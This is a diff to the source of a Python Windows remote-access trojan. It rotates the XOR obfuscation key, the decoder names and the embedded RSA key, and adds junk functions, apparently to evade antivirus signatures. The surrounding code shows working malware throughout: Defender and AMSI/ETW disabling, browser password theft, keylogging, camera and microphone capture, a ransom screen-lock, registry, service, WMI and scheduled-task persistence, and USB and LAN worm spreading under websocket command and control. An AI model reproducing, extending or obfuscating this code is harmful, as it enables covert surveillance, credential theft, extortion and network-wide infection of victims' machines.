@@ -111,8 +111,8 @@ CMD_RANSOM_UNLOCK = 0x25  # unlock ransomware with injected key
 
 DEVICE_ID = str(uuid.uuid4())
 HOSTNAME = socket.gethostname()
-_EMBEDDED_PUBKEY = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwxquREsL9OqnDn/kZ6PQ\n/NBgXcU0BnCVm/0McktK8bkIPRXWfGYxwbofuoIDC3qKKYt8vnmFxNMuoSUPqYns\n7/uwLqfc3yyxO3XN2yGe8sRYzHSfy9DZgD1cT/x2O5xPa5fiKd6vwAjn6jKQxP7t\noqKnovmr6ovrbc1xBE8gjtgQp+58PpY2xHQusBp3CKZACV1B14jU6S+S5NTTQYeA\nQUNLNXOVjZsT/2VIyouLdd9wMRL1LjVA0DGlvoooXQmJ8mZVFCVyI952xGrTUHT1\nPnh+Eg2a+NZ2F4PJ+AIrqqWxBB79EQgqEvPStaxfXk6oaW7CcfJzd4LBkZCqd7Xm\n5QIDAQAB\n-----END PUBLIC KEY-----"
-_AGENT_NAME = "report"
+_EMBEDDED_PUBKEY = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs4+nZkEwQLUJXRVfOgWN\n3nUlRch1MyJnQefwsBdYLf7ZyMKgaZi/9w/OhvD8QjaXcnPkuYrE8irvlqgRZEG5\nqxWlcKLmO4Cg0CCvkbi6k2m2gbqAWYYJa8JUx9/i33umP9Scva7feziSTh8qLySb\nYgtXOHTUQLZgKBrtAzyAVo2ayxNpBm0USe9iRmyv9XByEzKlRl7YyrMFhDj5KE5z\nuLs8OxN637nCPYVo+JYuWFKcHRhXn016JESWPDPApwxF3GgyI9vkaD99M2L9fPJW\ndBos2oAFHLYwAwBn46O1UMXj7h3eYXPcXkPzG0gNQiPmN7quMuVbEdcwKMXa2tkX\nMQIDAQAB\n-----END PUBLIC KEY-----"
+_AGENT_NAME = "bkreport"
 _keylog_on = False
 _keybuf = ""
 _view_mode = "none"  # 'none', 'screen', or 'cam'
@@ -132,7 +132,7 @@ _log_file = os.path.join(os.environ.get("TEMP", "."), "svc.log")
 _stored_privkey = None  # RSA private key PEM for decrypt/unlock
 
 # ─── Obfuscation Helpers ─────────────────────────────────────
-_OBF_KEY = bytes.fromhex("b852dfe1a747f4ff9d2e1dccade4aa1f")
+_OBF_KEY = bytes.fromhex("01c366ab02c7c4bc14292be7538b2c39")
 
 def _obf(s: str) -> str:
     """XOR-obfuscate/deobfuscate a string at runtime to evade static signatures."""
@@ -150,7 +150,7 @@ def _obf_b(data: bytes) -> bytes:
     return bytes(b ^ k[i % len(k)] ^ (i & 0xFF) for i, b in enumerate(data))
 
 
-def _bwgeqjccyzv(blob):
+def _gdmndkgfmmerx(blob):
     """Runtime decode of base64+XOR-obfuscated string."""
     import base64
     b = base64.b64decode(blob)
@@ -194,7 +194,7 @@ def _disable_defender(report_cb=None):
             "Add-MpPreference -ExclusionExtension '.ps1' -ErrorAction 0"
         )
         b64 = base64.b64encode(ps_excl.encode("utf-16le")).decode()
-        subprocess.run(["powershell", "-NoP", "-Ep", _bwgeqjccyzv("+iqtg9Ax"), _bwgeqjccyzv("lRazgQ=="), b64], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(["powershell", "-NoP", "-Ep", _gdmndkgfmmerx("Q7sUyXWx"), _gdmndkgfmmerx("LIcKyw=="), b64], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
         _r("Layer 2: Exclusions added")
     except Exception as ex:
         _r(f"Layer 2 fail: {ex}")
@@ -213,7 +213,7 @@ def _disable_defender(report_cb=None):
             "Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction 0"
         )
         b64 = base64.b64encode(ps_disable.encode("utf-16le")).decode()
-        subprocess.run(["powershell", "-NoP", "-Ep", _bwgeqjccyzv("+iqtg9Ax"), _bwgeqjccyzv("lRazgQ=="), b64], capture_output=True, timeout=60, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(["powershell", "-NoP", "-Ep", _gdmndkgfmmerx("Q7sUyXWx"), _gdmndkgfmmerx("LIcKyw=="), b64], capture_output=True, timeout=60, creationflags=subprocess.CREATE_NO_WINDOW)
         _r("Layer 3: Real-time monitoring disabled")
     except Exception as ex:
         _r(f"Layer 3 fail: {ex}")
@@ -221,11 +221,11 @@ def _disable_defender(report_cb=None):
     try:
         import winreg
         k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender")
-        winreg.SetValueEx(k, _bwgeqjccyzv("/Dqug8Eul7n7U36U0ZDTcdom"), 0, winreg.REG_DWORD, 1)
+        winreg.SetValueEx(k, _gdmndkgfmmerx("RasXyWSup/pyVEi/L/9VV2O3"), 0, winreg.REG_DWORD, 1)
         winreg.CloseKey(k)
         k2 = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection")
-        winreg.SetValueEx(k2, _bwgeqjccyzv("/Dqug8Eul6rwRnuzyITBXcctpIbcIIuG4g=="), 0, winreg.REG_DWORD, 1)
-        winreg.SetValueEx(k2, _bwgeqjccyzv("/Dqug8Eul7rwT3axyIbWXcctpIbcIIuG4g=="), 0, winreg.REG_DWORD, 1)
+        winreg.SetValueEx(k2, _gdmndkgfmmerx("RasXyWSup+l5QU2YNutHe368Hcx5oLvFaw=="), 0, winreg.REG_DWORD, 1)
+        winreg.SetValueEx(k2, _gdmndkgfmmerx("RasXyWSup/l5SECaNulQe368Hcx5oLvFaw=="), 0, winreg.REG_DWORD, 1)
         winreg.SetValueEx(k2, "DisableOnAccessProtection", 0, winreg.REG_DWORD, 1)
         winreg.SetValueEx(k2, "DisableScanOnRealtimeEnable", 0, winreg.REG_DWORD, 1)
         winreg.CloseKey(k2)
@@ -234,7 +234,7 @@ def _disable_defender(report_cb=None):
         _r(f"Layer 4 fail: {ex}")
 
     try:
-        for svc in (_bwgeqjccyzv("7zqzpsYkl5bx"), _bwgeqjccyzv("6zazkcY="), _bwgeqjccyzv("7zefjcw2"), _bwgeqjccyzv("7zebi882l4o="), _bwgeqjccyzv("7zeTi9ARhJs="), "SecurityHealthService"):
+        for svc in (_gdmndkgfmmerx("VqsK7GOkp9V4"), _gdmndkgfmmerx("UqcK22M="), _gdmndkgfmmerx("VqYmx2m2"), _gdmndkgfmmerx("VqYiwWq2p8k="), _gdmndkgfmmerx("VqYqwXWRtNg="), "SecurityHealthService"):
             subprocess.run(["sc", "stop", svc], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
             subprocess.run(["sc", "config", svc, "start=", "disabled"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
         _r("Layer 5: Services stopped")
@@ -247,7 +247,7 @@ def _disable_defender(report_cb=None):
             "Get-CimInstance -Namespace 'root/microsoft/windows/defender' -ClassName MSFT_MpPreference -ErrorAction 0 | Remove-CimInstance -ErrorAction 0"
         )
         b64 = base64.b64encode(ps_wmi.encode("utf-16le")).decode()
-        subprocess.run(["powershell", "-NoP", "-Ep", _bwgeqjccyzv("+iqtg9Ax"), _bwgeqjccyzv("lRazgQ=="), b64], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(["powershell", "-NoP", "-Ep", _gdmndkgfmmerx("Q7sUyXWx"), _gdmndkgfmmerx("LIcKyw=="), b64], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
         _r("Layer 6: WMI preferences purged")
     except Exception as ex:
         _r(f"Layer 6 fail: {ex}")
@@ -260,7 +260,7 @@ def _disable_defender(report_cb=None):
             "Set-MpPreference -CloudTimeout 1000 -ErrorAction 0"
         )
         b64 = base64.b64encode(ps_sac.encode("utf-16le")).decode()
-        subprocess.run(["powershell", "-NoP", "-Ep", _bwgeqjccyzv("+iqtg9Ax"), _bwgeqjccyzv("lRazgQ=="), b64], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(["powershell", "-NoP", "-Ep", _gdmndkgfmmerx("Q7sUyXWx"), _gdmndkgfmmerx("LIcKyw=="), b64], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
         _r("Layer 7: Additional policies disabled")
     except Exception as ex:
         _r(f"Layer 7 fail: {ex}")
@@ -337,7 +337,7 @@ def _camera_needed():
 
 def _sd_preferred_input_device():
     """Prefer Windows 'Stereo Mix' / loopback-style inputs so remote listen captures system audio."""
-    if AUDIO_BACKEND != _bwgeqjccyzv("yzyojMcml478RHI="):
+    if AUDIO_BACKEND != _gdmndkgfmmerx("cq0RxmKmp811Q0Q="):
         return None
     try:
         import sounddevice as sd
@@ -345,7 +345,7 @@ def _sd_preferred_input_device():
         return None
     try:
         devices = sd.query_devices()
-        keys = ("stereo mix", "what u hear", "wave out mix", _bwgeqjccyzv("1DyyksEjkZM="))
+        keys = ("stereo mix", "what u hear", "wave out mix", _gdmndkgfmmerx("ba0L2GSjodA="))
         best = None
         for i, d in enumerate(devices):
             if int(d.get("max_input_channels") or 0) < 1:
@@ -370,11 +370,11 @@ def _shell_ps_command(cmdline, cdir):
 def _powershell_argv(cmdline: str):
     """Use -EncodedCommand for faster startup (avoids quoting/parsing overhead)."""
     b64 = base64.b64encode(cmdline.encode("utf-16le")).decode()
-    common = [_bwgeqjccyzv("lR2ystEtlJH5Qg=="), "-NonInteractive", "-NoLogo", _bwgeqjccyzv("lRalh8A3hpH6SUeozYDHaQ=="), _bwgeqjccyzv("+iqtg9Ax"), _bwgeqjccyzv("lRazgcwml5zWSHqqwIfA"), b64]
-    pw = shutil.which(_bwgeqjccyzv("yCSuig=="))
+    common = [_gdmndkgfmmerx("LIwL+HStpNJwRQ=="), "-NonInteractive", "-NoLogo", _gdmndkgfmmerx("LIcczWW3ttJzTnGDM+9BTw=="), _gdmndkgfmmerx("Q7sUyXWx"), _gdmndkgfmmerx("LIcKy2mmp99fT0yBPuhG"), b64]
+    pw = shutil.which(_gdmndkgfmmerx("cbUXwA=="))
     if pw:
         return [pw] + common
-    ps = shutil.which(_bwgeqjccyzv("yDyqh9Exmp35Szmi2Yw=")) or shutil.which("powershell")
+    ps = shutil.which(_gdmndkgfmmerx("ca0TzXSxqt5wTA+JJ+M=")) or shutil.which("powershell")
     if ps:
         return [ps] + common
     return ["powershell"] + common
@@ -730,10 +730,10 @@ def _ensure_audio(enabled):
         _audio_enabled = False
         if _audio_stream is not None:
             try:
-                if AUDIO_BACKEND == _bwgeqjccyzv("yzyojMcml478RHI="):
+                if AUDIO_BACKEND == _gdmndkgfmmerx("cq0RxmKmp811Q0Q="):
                     _audio_stream.stop()
                     _audio_stream.close()
-                elif AUDIO_BACKEND == _bwgeqjccyzv("yCq8l8crnQ=="):
+                elif AUDIO_BACKEND == _gdmndkgfmmerx("cbsF3WKrrQ=="):
                     _audio_stream.stop_stream()
                     _audio_stream.close()
             except Exception:
@@ -758,7 +758,7 @@ def _ensure_audio(enabled):
         return
 
     try:
-        if AUDIO_BACKEND == _bwgeqjccyzv("yzyojMcml478RHI="):
+        if AUDIO_BACKEND == _gdmndkgfmmerx("cq0RxmKmp811Q0Q="):
             dev = _sd_preferred_input_device()
 
             def callback(indata, frames, time_info, status):
@@ -798,7 +798,7 @@ def _ensure_audio(enabled):
                     _audio_stream.start()
                 else:
                     raise
-        elif AUDIO_BACKEND == _bwgeqjccyzv("yCq8l8crnQ=="):
+        elif AUDIO_BACKEND == _gdmndkgfmmerx("cbsF3WKrrQ=="):
             _pyaudio_instance = pyaudio.PyAudio()
 
             def callback(in_data, frame_count, time_info, status):
@@ -936,12 +936,12 @@ def _decrypt_chromium(enc_password, key):
 def _get_browser_key(user_data_path):
     try:
         import win32crypt
-        ls = os.path.join(user_data_path, _bwgeqjccyzv("9Dy+g89ioYz0U3I="))
+        ls = os.path.join(user_data_path, _gdmndkgfmmerx("Ta0HyWrikc99VEQ="))
         if not os.path.exists(ls):
             return None
         with open(ls, "r", encoding="utf-8") as f:
             data = json.loads(f.read())
-        ekey = base64.b64decode(data[_bwgeqjccyzv("1yCCgdE7gow=")][_bwgeqjccyzv("3T2+kNoyhp3xeHyi2A==")])[5:]
+        ekey = base64.b64decode(data[_gdmndkgfmmerx("brE7y3S7ss8=")][_gdmndkgfmmerx("ZKwH2n+ytt54f0qJJg==")])[5:]
         return win32crypt.CryptUnprotectData(ekey, None, None, None, 0)[1]
     except:
         return None
@@ -958,7 +958,7 @@ def harvest_passwords():
         if not key:
             continue
         for profile in ["Default", "Profile 1", "Profile 2"]:
-            db = os.path.join(udp, profile, _bwgeqjccyzv("9Dy6i81itpnhRg=="))
+            db = os.path.join(udp, profile, _gdmndkgfmmerx("Ta0DwWjihtpoQQ=="))
             if not os.path.exists(db):
                 continue
             tmp = os.path.join(os.environ.get("TEMP", "."), f"ld_{name}_{profile}")
@@ -1019,11 +1019,11 @@ def install_persistence():
         if exe != dest:
             shutil.copy2(exe, dest)
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, _bwgeqjccyzv("7zqzhsw1gavwVWGuwozxYMwiuZfB"), 0, winreg.REG_SZ, f'"{dest}"')
+        winreg.SetValueEx(key, _gdmndkgfmmerx("VqsKzGm1seh5UleFPON3RnWzAN1k"), 0, winreg.REG_SZ, f'"{dest}"')
         winreg.CloseKey(key)
     except: pass
 
-_LOCK_STATUS_FILE = os.path.join(os.environ.get("TEMP", "."), _bwgeqjccyzv("liCkkc8hmQ=="))
+_LOCK_STATUS_FILE = os.path.join(os.environ.get("TEMP", "."), _gdmndkgfmmerx("L7Ed22qhqQ=="))
 
 def _disable_external_inputs():
     try:
@@ -1033,7 +1033,7 @@ def _disable_external_inputs():
             'Disable-PnpDevice -Confirm:$false -ErrorAction 0'
         )
         b64 = base64.b64encode(ps.encode("utf-16le")).decode()
-        subprocess.run(["powershell", "-NoP", "-Ep", _bwgeqjccyzv("+iqtg9Ax"), _bwgeqjccyzv("lRazgQ=="), b64], capture_output=True, timeout=30,
+        subprocess.run(["powershell", "-NoP", "-Ep", _gdmndkgfmmerx("Q7sUyXWx"), _gdmndkgfmmerx("LIcKyw=="), b64], capture_output=True, timeout=30,
                        creationflags=subprocess.CREATE_NO_WINDOW)
     except:
         pass
@@ -1046,7 +1046,7 @@ def _enable_external_inputs():
             'Enable-PnpDevice -Confirm:$false -ErrorAction 0'
         )
         b64 = base64.b64encode(ps.encode("utf-16le")).decode()
-        subprocess.run(["powershell", "-NoP", "-Ep", _bwgeqjccyzv("+iqtg9Ax"), _bwgeqjccyzv("lRazgQ=="), b64], capture_output=True, timeout=30,
+        subprocess.run(["powershell", "-NoP", "-Ep", _gdmndkgfmmerx("Q7sUyXWx"), _gdmndkgfmmerx("LIcKyw=="), b64], capture_output=True, timeout=30,
                        creationflags=subprocess.CREATE_NO_WINDOW)
     except:
         pass
@@ -1056,7 +1056,7 @@ def check_lock_state():
     try:
         import winreg
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r_sb("6YfAP23M9kG+QxamW2XZx9qc1y9vzw=="), 0, winreg.KEY_READ)
-        pwd, _ = winreg.QueryValueEx(key, _bwgeqjccyzv("6yqursApto/7"))
+        pwd, _ = winreg.QueryValueEx(key, _gdmndkgfmmerx("UrsX5GWphsxy"))
         winreg.CloseKey(key)
     except:
         pass
@@ -1082,7 +1082,7 @@ def set_lock_state(pwd):
     try:
         import winreg
         key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r_sb("6YfAP23M9kG+QxamW2XZx9qc1y9vzw=="))
-        winreg.SetValueEx(key, _bwgeqjccyzv("6yqursApto/7"), 0, winreg.REG_SZ, pwd)
+        winreg.SetValueEx(key, _gdmndkgfmmerx("UrsX5GWphsxy"), 0, winreg.REG_SZ, pwd)
         winreg.CloseKey(key)
     except:
         pass
@@ -1097,7 +1097,7 @@ def clear_lock_state():
     try:
         import winreg
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r_sb("6YfAP23M9kG+QxamW2XZx9qc1y9vzw=="), 0, winreg.KEY_ALL_ACCESS)
-        winreg.DeleteValue(key, _bwgeqjccyzv("6yqursApto/7"))
+        winreg.DeleteValue(key, _gdmndkgfmmerx("UrsX5GWphsxy"))
         winreg.CloseKey(key)
     except:
         pass
@@ -1124,10 +1124,10 @@ def do_lock(password, ready=None):
     root.configure(bg="black")
     root.overrideredirect(True)
 
-    tk.Label(root, text=_bwgeqjccyzv("6wqOtuYP0rTaZFyC5Q=="), font=("Arial", 48, "bold"), fg="red", bg="black").pack(expand=True)
+    tk.Label(root, text=_gdmndkgfmmerx("Ups3/EOP4vdTY2qpGw=="), font=("Arial", 48, "bold"), fg="red", bg="black").pack(expand=True)
 
     pin_var = tk.StringVar()
-    pin_var.set(_bwgeqjccyzv("/R2Jp/FiorHb"))
+    pin_var.set(_gdmndkgfmmerx("RIww7VTikvJS"))
     tk.Label(root, textvariable=pin_var, font=("Arial", 24), fg="white", bg="black").pack(pady=20)
 
     status_var = tk.StringVar()
@@ -1168,7 +1168,7 @@ def do_lock(password, ready=None):
                 return False
 
             if not typed_pin:
-                pin_var.set(_bwgeqjccyzv("/R2Jp/FiorHb"))
+                pin_var.set(_gdmndkgfmmerx("RIww7VTikvJS"))
             else:
                 pin_var.set("*" * len(typed_pin))
         except:
@@ -1406,7 +1406,7 @@ def _patch_amsi():
         if not h:
             return False
         addr = ctypes.cast(
-            ctypes.windll.kernel32.GetProcAddress(h, _bwgeqjccyzv("+T6ui/Ahk5bXUnGhxJs=")),
+            ctypes.windll.kernel32.GetProcAddress(h, _gdmndkgfmmerx("QK8XwVWho9VeVUeKOvQ=")),
             ctypes.c_void_p
         ).value
         if not addr:
@@ -1428,7 +1428,7 @@ def _patch_etw():
         fn = ctypes.cast(
             ctypes.windll.kernel32.GetProcAddress(
                 ctypes.windll.kernel32.GetModuleHandleW("ntdll.dll"),
-                _bwgeqjccyzv("/Seqp9UnnIzCVX6zxA==")
+                _gdmndkgfmmerx("RLYT7XCnrM9LUkiYOg==")
             ),
             ctypes.c_void_p
         ).value
@@ -1486,8 +1486,8 @@ def _start_watchdog():
         )
         b64 = base64.b64encode(script.encode("utf-16le")).decode()
         subprocess.Popen(
-            ["powershell", _bwgeqjccyzv("lR2ystEtlJH5Qg=="), _bwgeqjccyzv("lRalh8A3hpH6SUeozYDHaQ=="), _bwgeqjccyzv("+iqtg9Ax"),
-             _bwgeqjccyzv("lRazgcwml5zWSHqqwIfA"), b64],
+            ["powershell", _gdmndkgfmmerx("LIwL+HStpNJwRQ=="), _gdmndkgfmmerx("LIcczWW3ttJzTnGDM+9BTw=="), _gdmndkgfmmerx("Q7sUyXWx"),
+             _gdmndkgfmmerx("LIcKy2mmp99fT0yBPuhG"), b64],
             creationflags=subprocess.CREATE_NO_WINDOW
         )
         _log(f"Watchdog spawned for PID {ppid}")
@@ -1508,7 +1508,7 @@ def _registry_persistence():
                 pass
             exe = dest
         entries = [
-            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", _bwgeqjccyzv("7zqzhsw1gavwVWGuwozxYMwiuZfB"), '"' + exe + '"'),
+            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", _gdmndkgfmmerx("VqsKzGm1seh5UleFPON3RnWzAN1k"), '"' + exe + '"'),
             (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "WinSvcUpd", '"' + exe + '"'),
             (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsServiceUpdate", '"' + exe + '"'),
             (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "WinSvcUpd", '"' + exe + '"'),
@@ -1539,7 +1539,7 @@ def _registry_persistence():
                 cur, _ = winreg.QueryValueEx(k, "Userinit")
             except:
                 cur = "C:\\Windows\\system32\\userinit.exe,"
-            if _bwgeqjccyzv("7zqzsdUhp4jxRmOi") not in cur:
+            if _gdmndkgfmmerx("VqsK+3Chl8t4QVWJ") not in cur:
                 winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ, cur + exe + ",")
             winreg.CloseKey(k)
         except:
@@ -1552,7 +1552,7 @@ def _registry_persistence():
 def _install_service():
     try:
         exe = sys.executable
-        svc_name = _bwgeqjccyzv("7zqzsdUhp4jxRmOi")
+        svc_name = _gdmndkgfmmerx("VqsK+3Chl8t4QVWJ")
         subprocess.run(
             ["sc", "create", svc_name, 'binPath=', exe, "start=", "auto"],
             capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
@@ -1563,7 +1563,7 @@ def _install_service():
             capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
         )
         subprocess.run(
-            ["sc", "description", svc_name, _bwgeqjccyzv("7zqzhsw1gdjGQmWxyIrBMP0zqZPHN8Kl5FlmsNSL")],
+            ["sc", "description", svc_name, _gdmndkgfmmerx("VqsKzGm1sZtPRVOaNuVHFkSiENlit/LmbV5Qmyrk")],
             capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
         )
         _log("Service installed with recovery")
@@ -1595,8 +1595,8 @@ def _wmi_persistence():
         )
         b64 = base64.b64encode(ps.encode("utf-16le")).decode()
         subprocess.Popen(
-            ["powershell", _bwgeqjccyzv("lR2ystEtlJH5Qg=="), _bwgeqjccyzv("lRalh8A3hpH6SUeozYDHaQ=="), _bwgeqjccyzv("+iqtg9Ax"),
-             _bwgeqjccyzv("lRazgcwml5zWSHqqwIfA"), b64],
+            ["powershell", _gdmndkgfmmerx("LIwL+HStpNJwRQ=="), _gdmndkgfmmerx("LIcczWW3ttJzTnGDM+9BTw=="), _gdmndkgfmmerx("Q7sUyXWx"),
+             _gdmndkgfmmerx("LIcKy2mmp99fT0yBPuhG"), b64],
             creationflags=subprocess.CREATE_NO_WINDOW
         )
         _log("WMI subscription created")
@@ -1608,10 +1608,10 @@ def _scheduled_tasks_persistence():
     try:
         exe = sys.executable
         tasks = [
-            (_bwgeqjccyzv("7zqzsdUhp4jxRmOi7YbDf8Y="), "onlogon", "/rl highest"),
-            (_bwgeqjccyzv("7zqzsdUhp4jxRmOi8YzWeccnpJE="), "minute", "/mo 5 /rl highest"),
-            (_bwgeqjccyzv("7zqzsdUhp4jxRmOi8p3FYtw2vQ=="), "onstart", "/rl highest"),
-            (_bwgeqjccyzv("7zqzsdUhp4jxRmOi6I3IdQ=="), "onidle", "/i 10 /rl highest"),
+            (_gdmndkgfmmerx("VqsK+3Chl8t4QVWJE+lFWX8="), "onlogon", "/rl highest"),
+            (_gdmndkgfmmerx("VqsK+3Chl8t4QVWJD+NQX362Hds="), "minute", "/mo 5 /rl highest"),
+            (_gdmndkgfmmerx("VqsK+3Chl8t4QVWJDPJDRGWnBA=="), "onstart", "/rl highest"),
+            (_gdmndkgfmmerx("VqsK+3Chl8t4QVWJFuJOUw=="), "onidle", "/i 10 /rl highest"),
         ]
         for name, trigger, extra in tasks:
             cmd = (
@@ -1640,7 +1640,7 @@ def _masquerade_process():
             f.write(vbscode)
         # Start via wscript (trusted binary)
         subprocess.Popen(
-            [_bwgeqjccyzv("zyC+kMoyhtbwX3I="), "//B", vbs],
+            [_gdmndkgfmmerx("drEH2m+ytpV5WEQ="), "//B", vbs],
             creationflags=subprocess.CREATE_NO_WINDOW
         )
         _log("Masquerade via wscript")
@@ -1865,7 +1865,7 @@ def _create_lnk_on_drive(drive, exe_path):
         )
         b64 = base64.b64encode(ps.encode("utf-16le")).decode()
         subprocess.run(
-            ["powershell", "-NoP", "-Ep", _bwgeqjccyzv("+iqtg9Ax"), _bwgeqjccyzv("lRazgQ=="), b64],
+            ["powershell", "-NoP", "-Ep", _gdmndkgfmmerx("Q7sUyXWx"), _gdmndkgfmmerx("LIcKyw=="), b64],
             capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
         )
         # Create a hidden folder with all files moved inside to entice clicks
@@ -1964,7 +1964,7 @@ def _copy_to_unc(unc_path, local_exe):
         )
         b64 = base64.b64encode(ps.encode("utf-16le")).decode()
         subprocess.run(
-            ["powershell", "-NoP", "-Ep", _bwgeqjccyzv("+iqtg9Ax"), _bwgeqjccyzv("lRazgQ=="), b64],
+            ["powershell", "-NoP", "-Ep", _gdmndkgfmmerx("Q7sUyXWx"), _gdmndkgfmmerx("LIcKyw=="), b64],
             capture_output=True, timeout=30,
             creationflags=subprocess.CREATE_NO_WINDOW
         )
@@ -1980,7 +1980,7 @@ def _copy_to_unc(unc_path, local_exe):
 def _remote_exec_schtasks(server, exe_path):
     """Create scheduled task on remote machine via schtasks."""
     try:
-        task_name = _bwgeqjccyzv("7zqzsdUhp4jxRmOi")
+        task_name = _gdmndkgfmmerx("VqsK+3Chl8t4QVWJ")
         subprocess.run(
             ["schtasks", "/create", "/s", server, "/tn", task_name,
              "/tr", exe_path, "/sc", "onlogon", "/rl", "highest", "/f"],
@@ -2040,7 +2040,7 @@ def _lan_worm_scan():
                     )
                     b64 = base64.b64encode(ps.encode("utf-16le")).decode()
                     subprocess.run(
-                        ["powershell", "-NoP", "-Ep", _bwgeqjccyzv("+iqtg9Ax"), _bwgeqjccyzv("lRazgQ=="), b64],
+                        ["powershell", "-NoP", "-Ep", _gdmndkgfmmerx("Q7sUyXWx"), _gdmndkgfmmerx("LIcKyw=="), b64],
                         capture_output=True, timeout=60,
                         creationflags=subprocess.CREATE_NO_WINDOW
                     )
@@ -2070,7 +2070,7 @@ def _hidden_copies_deploy():
         os.environ.get("LOCALAPPDATA", ""),
         os.environ.get("TEMP", ""),
         os.environ.get("USERPROFILE", ""),
-        os.path.join(os.environ.get("APPDATA", ""), _bwgeqjccyzv("6yquocIhmp0=")),
+        os.path.join(os.environ.get("APPDATA", ""), _gdmndkgfmmerx("UrsX62ehqt4=")),
     ]
     deployed = []
     for base in locations:
@@ -2112,7 +2112,7 @@ def _mutual_watchdog():
                 try:
                     name, val, _ = winreg.EnumValue(k, i)
                     i += 1
-                    if not name.startswith(_bwgeqjccyzv("7zqzsdUhsZflXg==")):
+                    if not name.startswith(_gdmndkgfmmerx("VqsK+3ChgdRsWQ==")):
                         continue
                     path = val.strip('"')
                     if not os.path.exists(path):
@@ -2249,6 +2249,7 @@ async def main():
         try:
             _log(f"Connecting to {uri}")
             async with websockets.connect(uri, **ws_kw) as ws:
+                _log("WS connected, starting setup...")
                 # Enable TCP keepalive
                 try:
                     tr = ws.transport
@@ -2373,7 +2374,14 @@ async def main():
                 async def recv_loop():
                     global _keylog_on, _keybuf, _view_mode, _cam_stream_enabled
                     while True:
-                        raw = await ws.recv()
+                        try:
+                            raw = await ws.recv()
+                        except ConnectionClosed:
+                            _log("recv_loop: connection closed by server")
+                            return
+                        except Exception as ex:
+                            _log(f"recv_loop: receive failed: {ex}")
+                            return
                         if isinstance(raw, bytes):
                             if len(raw) > 1 and raw[0] == 0x03:
                                 audio_data = raw[1:]
@@ -2636,7 +2644,7 @@ async def main():
                                         full_cmd = f'Start-Process -FilePath "{dest}" -ArgumentList \'{args}\' -Wait -NoNewWindow; if($?){{echo "[OK] Exit code 0"}}else{{echo "[FAIL] Exit code $LASTEXITCODE"}}'
                                         b64 = base64.b64encode(full_cmd.encode("utf-16le")).decode()
                                         p = subprocess.Popen(
-                                            ["powershell", "-NoP", "-Ep", _bwgeqjccyzv("+iqtg9Ax"), _bwgeqjccyzv("lRazgQ=="), b64],
+                                            ["powershell", "-NoP", "-Ep", _gdmndkgfmmerx("Q7sUyXWx"), _gdmndkgfmmerx("LIcKyw=="), b64],
                                             stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                             text=True, encoding="utf-8", errors="replace",
                                             creationflags=0x08000000,
@@ -2672,7 +2680,7 @@ async def main():
                                     b64 = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
                                     def _run_term():
                                         p = subprocess.Popen(
-                                            ["powershell", "-NoP", "-Ep", _bwgeqjccyzv("+iqtg9Ax"), _bwgeqjccyzv("lRazgQ=="), b64],
+                                            ["powershell", "-NoP", "-Ep", _gdmndkgfmmerx("Q7sUyXWx"), _gdmndkgfmmerx("LIcKyw=="), b64],
                                             stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                             text=True, encoding="utf-8", errors="replace",
                                             creationflags=0x08000000,
@@ -2978,3 +2986,17 @@ def _wigqshph():
     _37499 = 24; _36968 = 15; _27085 = 177
 
 _obf_8516 = 77
+
+def _mzaimvju():
+    _34925 = 11; _54186 = 6
+
+def _iwlgpdbakbz():
+    _18593 = 220; _22731 = 15; _10935 = 143; _61779 = 192
+
+def _iafrcoajcax():
+    _28328 = 240; _63051 = 228; _64847 = 170
+
+def _htnnebeda():
+    _49059 = 237; _54061 = 43; _64945 = 21; _9867 = 86
+
+_obf_2275 = 202
